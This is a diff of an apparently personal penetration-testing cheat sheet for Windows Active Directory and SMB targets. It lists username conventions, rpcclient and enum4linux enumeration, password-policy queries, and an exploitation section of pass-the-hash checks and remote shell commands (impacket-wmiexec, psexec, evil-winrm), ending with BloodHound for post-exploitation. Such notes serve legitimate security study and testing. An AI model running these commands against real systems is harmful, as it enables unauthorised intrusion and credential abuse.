@@ -1,73 +1,67 @@
-Domain username convention:
-	firstlast
-	flast
-	firlas
-	first.last
-	f.last
-	fir.las
+https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
 
-AS-REP Roasting attack
-Kerberoasting attack
-DCSync attack
+## Domain username convention
+firstlast
+flast
+firlas
+first.last
+f.last
+fir.las
 
-
-Enum4linux <IP>
-	use 2>/dev/null to discard error output
+`python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'`
 
 
-INFO
-	rpcclient -U 'USERNAME' -N <IP>
-	rpcclient -U 'USERNAME'%'PASSWORD' <IP>
-		Domainname & info & SID
-	        	lsaquery
-	        	querydominfo
-		OS information
- 			srvinfo
-		Password Policy
-	        	getdompwinfo
-		Printer info
-	      		enumprinters
-		Users & get SID & SID lookup
- 		       	enumdomusers			(domain users & RIDs)
- 		       	querydispinfo			    (accounts & RIDs)
- 		       	queryuser RID			   (info domain user)
-		Groups
- 		       	enumdomgroups		       (domain groups & RIDs)
- 		       	querygroup RID			  (info domain group)
- 		       	querygroupmem RID	     (user RID in group)
- 		       	enumalsgroups builtin	      (builtin groups)
- 	      		enumalsgroups domain	   (local groups)
-		SID
- 	      		lsaenumsid			     (LSA SIDs)
- 		       	lookupnames USERNAMES   (SID lookup)
- 		       	lookupsids SID			    (name lookup)
-		Shares
- 		       	netshareenumall
- 		       	netsharegetinfo
-
-	
-PASSWORD POLICY
-	polenum 'USERNAME':'PASSWORD'@TARGET
+## Password Policy
+`polenum 'USERNAME':'PASSWORD'@IP`
+`crackmapexec smb IP -u '' -p '' --pass-pol`
 
 
-SHARES
-	permissions listing & NTLM hash login
-	smbmap -H TARGET
-	smbmap -p '' -H TARGET
-	smbmap -u 'robots' -p '' -H TARGET
-	smbmap -u 'robots' -H TARGET
+## Password Bruteforce
 
-	permissions listing & NTLM hash login
-	crackmapexec smb <IP> --shares
-	crackmapexec smb <IP> --shares -u 'robots' -p ''
 
-	NTLM hash login
-	smbclient -U 'robots'%'' -L //<IP>/
+## Info
+`Enum4linux <IP> 2>/dev/null`
+`rpcclient -U 'USERNAME' -N <IP>`
+`rpcclient -U 'USERNAME'%'PASSWORD' <IP>`
+Domainname & info & SID
+        	lsaquery
+        	querydominfo
+	OS information
+		srvinfo
+	Password Policy
+        	getdompwinfo
+	Printer info
+      		enumprinters
+	Users & get SID & SID lookup
+	       	enumdomusers			(domain users & RIDs)
+	       	querydispinfo			    (accounts & RIDs)
+	       	queryuser RID			   (info domain user)
+	Groups
+	       	enumdomgroups		       (domain groups & RIDs)
+	       	querygroup RID			  (info domain group)
+	       	querygroupmem RID	     (user RID in group)
+	       	enumalsgroups builtin	      (builtin groups)
+      		enumalsgroups domain	   (local groups)
+	SID
+      		lsaenumsid			     (LSA SIDs)
+	       	lookupnames USERNAMES   (SID lookup)
+	       	lookupsids SID			    (name lookup)
+	Shares
+	       	netshareenumall
+	       	netsharegetinfo
 
-	
-FILES
-	-
-	
 
-PASSWORD BRUTEFORCE
-	-
+## Expoitation
+#### Check
+`crackmapexec SERVICE IP -u "USER" -p PASS`
+`crackmapexec SERVICE IP -u "USER" -H HASH`
+
+#### Shell
+`impacket-wmiexec -hashes 'HASH' USER@IP`
+`impacket-psexec -hashes 'HASH' USER@IP`
+`evil-winrm -i IP -u USER -H "HASH"`
+`evil-winrm -i IP -u USER -p "PASS"`
+
+## Post-exploitation
+`Bloodhound`
+`SharpHound`
